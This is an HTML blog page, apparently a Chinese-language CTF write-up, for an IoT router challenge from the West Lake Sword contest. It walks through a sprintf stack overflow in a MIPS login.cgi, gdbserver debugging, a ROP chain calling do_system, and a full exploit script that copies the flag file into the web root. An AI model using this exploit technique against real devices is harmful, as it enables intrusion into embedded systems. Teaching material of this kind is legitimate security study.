@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0x00最近开始学习IOT了，做了一下今年年初的西湖论剑的IOT题目，过程还是挺坎坷的，记录下过程。:yum: 0x01:启动题目给出了启动脚本，但是我们想要调试程序的话，比如 1.&#x2F;gdbserver :1234 --attach PID  是没法在宿主机中访问到gdbserver开启的端口的 需要修改一下脚本，加一个端口映射。 123sudo qemu-system-mipsel -M mal">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第八届西湖论剑初赛IOT-linkon的wp">
+<meta property="og:url" content="https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/index.html">
+<meta property="og:site_name" content="pfwqdxwdd">
+<meta property="og:description" content="0x00最近开始学习IOT了，做了一下今年年初的西湖论剑的IOT题目，过程还是挺坎坷的，记录下过程。:yum: 0x01:启动题目给出了启动脚本，但是我们想要调试程序的话，比如 1.&#x2F;gdbserver :1234 --attach PID  是没法在宿主机中访问到gdbserver开启的端口的 需要修改一下脚本，加一个端口映射。 123sudo qemu-system-mipsel -M mal">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515203302063.png">
+<meta property="og:image" content="https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515210006878.png">
+<meta property="og:image" content="https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515204142171.png">
+<meta property="og:image" content="https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515204219221.png">
+<meta property="og:image" content="https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515204336900.png">
+<meta property="og:image" content="https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515205351181.png">
+<meta property="og:image" content="https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515210905239.png">
+<meta property="og:image" content="https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515211010924.png">
+<meta property="og:image" content="https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515211411972.png">
+<meta property="og:image" content="https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515211705573.png">
+<meta property="og:image" content="https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515211802716.png">
+<meta property="og:image" content="https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515213717964.png">
+<meta property="og:image" content="https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515220041487.png">
+<meta property="article:published_time" content="2025-05-10T12:18:24.000Z">
+<meta property="article:modified_time" content="2025-05-15T14:01:13.772Z">
+<meta property="article:author" content="pfwqdxwdd">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="iot">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515203302063.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>第八届西湖论剑初赛IOT-linkon的wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/categories/">catagrioes</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/04/27/ACTF2025%20pwn%20%E9%83%A8%E5%88%86wp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/&text=第八届西湖论剑初赛IOT-linkon的wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/&title=第八届西湖论剑初赛IOT-linkon的wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/&is_video=false&description=第八届西湖论剑初赛IOT-linkon的wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=第八届西湖论剑初赛IOT-linkon的wp&body=Check out this article: https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/&title=第八届西湖论剑初赛IOT-linkon的wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/&title=第八届西湖论剑初赛IOT-linkon的wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/&title=第八届西湖论剑初赛IOT-linkon的wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/&title=第八届西湖论剑初赛IOT-linkon的wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/&name=第八届西湖论剑初赛IOT-linkon的wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/&t=第八届西湖论剑初赛IOT-linkon的wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00"><span class="toc-number">1.</span> <span class="toc-text">0x00</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E5%90%AF%E5%8A%A8"><span class="toc-number">2.</span> <span class="toc-text">0x01:启动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E5%88%86%E6%9E%90%E7%A8%8B%E5%BA%8F"><span class="toc-number">3.</span> <span class="toc-text">0x02:分析程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">0x03:验证漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F"><span class="toc-number">5.</span> <span class="toc-text">0x04:调试程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">6.</span> <span class="toc-text">0x05:漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4exp"><span class="toc-number">6.1.</span> <span class="toc-text">完整exp</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        第八届西湖论剑初赛IOT-linkon的wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">pfwqdxwdd</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-05-10T12:18:24.000Z" class="dt-published" itemprop="datePublished">2025-05-10</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/wp/">wp</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/iot/" rel="tag">iot</a>, <a class="p-category" href="/tags/wp/" rel="tag">wp</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><p>最近开始学习IOT了，做了一下今年年初的西湖论剑的IOT题目，过程还是挺坎坷的，记录下过程。:yum:</p>
+<h3 id="0x01-启动"><a href="#0x01-启动" class="headerlink" title="0x01:启动"></a>0x01:启动</h3><p>题目给出了启动脚本，但是我们想要调试程序的话，比如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gdbserver :1234 --attach PID</span><br></pre></td></tr></table></figure>
+
+<p>是没法在宿主机中访问到gdbserver开启的端口的</p>
+<p>需要修改一下脚本，加一个端口映射。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot;  -net user,hostfwd=tcp::80-:80,hostfwd=tcp::2222-:22,hostfwd=tcp::1234-:1234 -net nic -nographic</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-分析程序"><a href="#0x02-分析程序" class="headerlink" title="0x02:分析程序"></a>0x02:分析程序</h3><p>启动服务后，随便输点东西</p>
+<p><img src="/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515203302063.png" alt="image-20250515203302063"></p>
+<p>会发现程序到了cgi-bin目录下的login.cgi</p>
+<p>分析这个文件</p>
+<p><img src="/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515210006878.png" alt="image-20250515210006878"></p>
+<p>32位mips程序</p>
+<p><img src="/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515204142171.png" alt="image-20250515204142171"></p>
+<p>web_get函数读入一个参数page,</p>
+<p><img src="/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515204219221.png" alt="image-20250515204219221"></p>
+<p>page参数等于Goto_chidx时，程序向下执行会进入Goto_chidx函数，</p>
+<p><img src="/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515204336900.png" alt="image-20250515204336900"></p>
+<p>其中的sprintf函数存在栈溢出，控制好参数wlanUrl即可通过sprintf放入v9,造成栈溢出</p>
+<h3 id="0x03-验证漏洞"><a href="#0x03-验证漏洞" class="headerlink" title="0x03:验证漏洞"></a>0x03:验证漏洞</h3><p><img src="/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515205351181.png" alt="image-20250515205351181"></p>
+<p>可以看到手动把page改为函数名，通过设置wlanUrl，可以让程序返回500，成功验证漏洞</p>
+<h3 id="0x04-调试程序"><a href="#0x04-调试程序" class="headerlink" title="0x04:调试程序"></a>0x04:调试程序</h3><p>我们可以通过用gdbserver来调试程序<a target="_blank" rel="noopener" href="https://github.com/rapid7/embedded-tools/blob/master/binaries/gdbserver/gdbserver.mipsle">gdbserver下载地址，32位mips</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gdbserver.mipsle :1234 --attach PID</span><br></pre></td></tr></table></figure>
+
+<p>PID为要调试进程的PID，可以通过ps -ef查看，</p>
+<p>但是我们要调试的程序在瞬间结束的，无法通过正常方式调试到想要的函数</p>
+<p>这时候我们可以通过把程序想要调试的部分提前在ida中patch出一个循环，让程序卡在那里，同样我们的gdb也会卡在这里，再用set命令，调整回来，即可实现调试想要调试的部分</p>
+<p>这里我选择patch掉0x4039FC处的代码，正好再return的nop之前</p>
+<p><img src="/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515210905239.png" alt="image-20250515210905239"></p>
+<p>mips中无限循环的语句是<br>FF FF 00 10</p>
+<p>修改后效果</p>
+<p><img src="/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515211010924.png" alt="image-20250515211010924"></p>
+<p>替换掉qemu中原本的login,cgi</p>
+<p>调试脚本:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">url = &quot;http://192.168.2.129/cgi-bin/login.cgi&quot;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;Host&quot;: &quot;192.168.2.129&quot;,</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0&quot;,</span><br><span class="line">    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,</span><br><span class="line">    &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;,</span><br><span class="line">    &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br&quot;,</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,</span><br><span class="line">    &quot;Origin&quot;: &quot;http://192.168.2.129&quot;,</span><br><span class="line">    &quot;Connection&quot;: &quot;keep-alive&quot;,</span><br><span class="line">    &quot;Referer&quot;: &quot;http://192.168.2.129/&quot;,</span><br><span class="line">    &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;Priority&quot;: &quot;u=0, i&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*0x100</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;page&#x27;: &#x27;Goto_chidx&#x27;,</span><br><span class="line">    &#x27;wlanUrl&#x27;: payload,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, headers=headers, data=data)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>调试时候启动这个脚本，再ps -ef</p>
+<p>可以看到</p>
+<p><img src="/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515211411972.png" alt="image-20250515211411972"></p>
+<p>多出一条与login.cgi路径很接近的进程,在启动脚本之前是没有的，猜测这就是卡住的login.cgi</p>
+<p>gdbserver这个进程后，</p>
+<p>在宿主机中启动gdb-multiarch 连上1234端口</p>
+<p><img src="/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515211705573.png" alt="image-20250515211705573"></p>
+<p>发现程序停在了预定patch的循环处，然后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set *0x4039fc=0x8f998078</span><br></pre></td></tr></table></figure>
+
+<p>把程序patch回来</p>
+<p><img src="/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515211802716.png" alt="image-20250515211802716"></p>
+<p>即可进行正常调试</p>
+<h3 id="0x05-漏洞利用"><a href="#0x05-漏洞利用" class="headerlink" title="0x05:漏洞利用"></a>0x05:漏洞利用</h3><p><img src="/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515213717964.png" alt="image-20250515213717964"></p>
+<p>在进行跳转之前有这些指令可以供我们来控制ra,s2,s1,s0</p>
+<p>之后用到了两条gadgets</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># .fini:0000A554                 lw      $gp, 16($sp)</span></span><br><span class="line"><span class="comment"># .fini:0000A558                 nop</span></span><br><span class="line"><span class="comment"># .fini:0000A55C                 lw      $ra, 28($sp)</span></span><br><span class="line"><span class="comment"># .fini:0000A560                 jr      $ra</span></span><br></pre></td></tr></table></figure>
+
+<p>用来恢复gp,</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># .text:00007978                 la      $t9, -0x7f38($gp)</span></span><br><span class="line"><span class="comment"># .text:0000797C                 nop</span></span><br><span class="line"><span class="comment"># .text:00007980                 jalr    $t9 </span></span><br><span class="line"><span class="comment"># .text:00007984                 move    $a0, $s0</span></span><br></pre></td></tr></table></figure>
+
+<p>用来执行do_system</p>
+<p>参数由s0传入a0</p>
+<p>通过在payload中设置关于sp的各种偏移，</p>
+<p>最终执行dosystem</p>
+<h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">url = &quot;http://192.168.2.129/cgi-bin/login.cgi&quot;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;Host&quot;: &quot;192.168.2.129&quot;,</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0&quot;,</span><br><span class="line">    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,</span><br><span class="line">    &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;,</span><br><span class="line">    &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br&quot;,</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,</span><br><span class="line">    &quot;Origin&quot;: &quot;http://192.168.2.129&quot;,</span><br><span class="line">    &quot;Connection&quot;: &quot;keep-alive&quot;,</span><br><span class="line">    &quot;Referer&quot;: &quot;http://192.168.2.129/&quot;,</span><br><span class="line">    &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;Priority&quot;: &quot;u=0, i&quot;</span><br><span class="line">&#125;</span><br><span class="line">v9=0x7fff64c0</span><br><span class="line">libc_base=0x77e1e000 #/root/cpio-root/lib/libwebutil.so</span><br><span class="line">stack = 0x7fff6610</span><br><span class="line"></span><br><span class="line">payload = b&quot;a&quot;*0x80</span><br><span class="line">payload += p32(stack+0x20-0xa0)# $s0</span><br><span class="line">payload += b&quot;a&quot;*8</span><br><span class="line">payload += p32(libc_base+0xa554)</span><br><span class="line">payload += b&quot;b&quot;*16</span><br><span class="line">payload += p32(0x77e7b550)# $gp</span><br><span class="line">payload += b&quot;c&quot;*8</span><br><span class="line">payload += p32(libc_base+0x7978)</span><br><span class="line">payload += b&quot;a&quot;*0x20</span><br><span class="line">payload += b&quot;cp /flag /etc_ro/lighttpd/www/bbb.txt;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;page&#x27;: &#x27;Goto_chidx&#x27;,</span><br><span class="line">    &#x27;wlanUrl&#x27;: payload,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, headers=headers, data=data)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>把文件恢复后</p>
+<p>可以通过访问bbb.txt看到打印出的flag</p>
+<p><img src="/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/image-20250515220041487.png" alt="image-20250515220041487"></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/categories/">catagrioes</a></li>
+        
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00"><span class="toc-number">1.</span> <span class="toc-text">0x00</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E5%90%AF%E5%8A%A8"><span class="toc-number">2.</span> <span class="toc-text">0x01:启动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E5%88%86%E6%9E%90%E7%A8%8B%E5%BA%8F"><span class="toc-number">3.</span> <span class="toc-text">0x02:分析程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">0x03:验证漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F"><span class="toc-number">5.</span> <span class="toc-text">0x04:调试程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">6.</span> <span class="toc-text">0x05:漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4exp"><span class="toc-number">6.1.</span> <span class="toc-text">完整exp</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/&text=第八届西湖论剑初赛IOT-linkon的wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://pfwqdxwdd.github.io/2025/05/10/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91IOT-linkon/&title=第八届西湖论剑初赛IOT-linkon的wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
